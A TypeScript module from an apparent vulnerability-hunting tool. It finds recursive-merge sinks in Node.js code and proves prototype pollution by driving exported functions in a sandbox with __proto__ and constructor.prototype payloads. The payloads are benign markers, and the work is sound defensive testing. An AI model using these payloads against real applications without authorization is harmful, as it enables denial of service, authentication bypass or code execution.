import { readFileSync } from "node:fs";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import type { Exploit } from "../types.js";
import type { Sandbox } from "../sandbox.js";
import { type Attacker, type StaticLead, NODE_RUN, NODE_SOURCE_RE, freshMarker, nodeExportedNames, scanSinkLeads } from "./attacker.js";

const HERE = dirname(fileURLToPath(import.meta.url));

// Prototype pollution (CWE-1321): an entrypoint recursively merges or path-assigns keys from an
// attacker-shaped object into a target WITHOUT filtering `__proto__` / `constructor` / `prototype`.
// A payload like `{"__proto__":{"polluted":X}}` then writes X onto `Object.prototype`, so EVERY object
// in the process inherits it — enabling DoS, auth/logic bypass, or gadget-driven RCE downstream. The
// find is a recursive merge/set sink with no key guard; the proof is a FIRED pollution: after driving
// the entrypoint, a brand-new `{}` carries the injected property.

// A recursive-merge / deep-assign / path-set sink — where untrusted keys get written into a target.
const MERGE_SINK_RE =
  /\b(?:deep(?:ly)?[_-]?(?:Merge|Assign|Extend|Set|Defaults)|merge(?:Deep|With|Options|Config|Defaults)?|extend|mixin|assignDeep|setWith|setPath|updateIn|objectAssignDeep|defaultsDeep)\s*\(|\bfor\s*\(\s*(?:const|let|var)\s+\w+\s+(?:in|of)\b[^)]*\)[^{]*\{[^}]*\[\s*\w+\s*\]\s*=/;

/**
 * Drive the entrypoint with prototype-pollution payloads (`__proto__` and `constructor.prototype`
 * vectors, in object-merge and path-set shapes), then check whether a FRESH `{}` inherited the injected
 * marker. Fired = `({})[marker] === marker`, i.e. `Object.prototype` was polluted. A guarded merge that
 * skips the dangerous keys leaves the fresh object clean.
 */
function pollutionDriver(moduleRel: string, fnName: string, marker: string): string {
  const mod = JSON.stringify("./" + moduleRel);
  const F = JSON.stringify(fnName);
  const MK = JSON.stringify(marker);
  return `
const MK = ${MK};
let m;
try { m = await import(${mod}); } catch (e) { process.stdout.write("IMPORT_FAIL:" + e); process.exit(0); }
function pick(n){ if (m && typeof m[n]==="function") return m[n]; if (m && m.default && typeof m.default[n]==="function") return m.default[n]; return null; }
const fn = pick(${F});
if (!fn) { process.stdout.write("NOT_A_FUNCTION"); process.exit(0); }
function clean(){ try { delete Object.prototype[MK]; delete Object.prototype["polluted_"+MK]; } catch(e){} }
function polluted(){ return ({})[MK] === MK || ({})["polluted_"+MK] === MK; }
// payloads: __proto__ and constructor.prototype vectors as OWN keys (JSON.parse keeps __proto__ as own key)
const p1 = JSON.parse('{"__proto__":{"'+MK+'":"'+MK+'"}}');
const p2 = JSON.parse('{"constructor":{"prototype":{"'+MK+'":"'+MK+'"}}}');
// call shapes: merge(target, src) / merge(src) / set(obj, path, val) style
const attempts = [
  () => fn({}, p1), () => fn({}, p2), () => fn(p1), () => fn(p1, {}),
  () => fn({}, "__proto__."+MK, MK), () => fn({}, ["__proto__", MK], MK),
  () => fn({}, "constructor.prototype.polluted_"+MK, MK),
];
for (const a of attempts){
  clean();
  try { await a(); } catch(e){}
  if (polluted()){ process.stdout.write("PROTO_FIRED marker="+MK); clean(); process.exit(0); }
}
clean();
process.stdout.write("no-pollution");
`.trim();
}

export class PrototypePollutionAttacker implements Attacker {
  readonly attackClass = "prototype-pollution" as const;
  readonly canaryFixtureDir = resolve(HERE, "..", "..", "fixtures", "prototype-pollution-node");

  handles(file: string): boolean {
    return NODE_SOURCE_RE.test(file);
  }

  staticLeads(source: string): StaticLead[] {
    return scanSinkLeads(source, MERGE_SINK_RE);
  }

  hunt(targetDir: string, files: string[], sandbox: Sandbox): Exploit[] {
    const exploits: Exploit[] = [];
    for (const file of files) {
      if (!this.handles(file)) continue;
      let source: string;
      try {
        source = readFileSync(join(targetDir, file), "utf8");
      } catch {
        continue;
      }
      if (!MERGE_SINK_RE.test(source)) continue; // no recursive-merge/set sink here
      const names = nodeExportedNames(source);
      if (names.length === 0) continue;

      let fired = false;
      for (const name of names) {
        if (fired) break;
        const marker = freshMarker();
        const driverRel = `.raeuber-proto-${marker}.mjs`;
        sandbox.writeFile(driverRel, pollutionDriver(file, name, marker));
        const run = sandbox.exec(`${NODE_RUN} ${driverRel} 2>&1`, 15_000);
        const out = run.stdout + run.stderr;
        if (!out.includes("PROTO_FIRED")) continue;
        exploits.push({
          attackClass: "prototype-pollution",
          proof: "prototype-polluted",
          file,
          line: 1,
          sink: `merge-sink(${name})`,
          summary:
            `Exported \`${name}()\` merges/assigns attacker-controlled keys into a target without filtering \`__proto__\`/\`constructor.prototype\`; a \`{"__proto__":{…}}\` payload polluted \`Object.prototype\` — after the call a fresh \`{}\` inherited the injected property (CWE-1321). Every object in the process is affected (DoS / logic-bypass / gadget-RCE surface).`,
          payload: `${name}({}, JSON.parse('{"__proto__":{"${marker}":"${marker}"}}'))`,
          evidence:
            `driver drove \`${name}()\` with a \`__proto__\`/\`constructor.prototype\` payload; afterwards a ` +
            `brand-new \`{}\` carried the injected marker \`${marker}\` — Object.prototype was polluted:\n` +
            out.slice(0, 500),
        });
        fired = true;
      }
    }
    return exploits;
  }
}
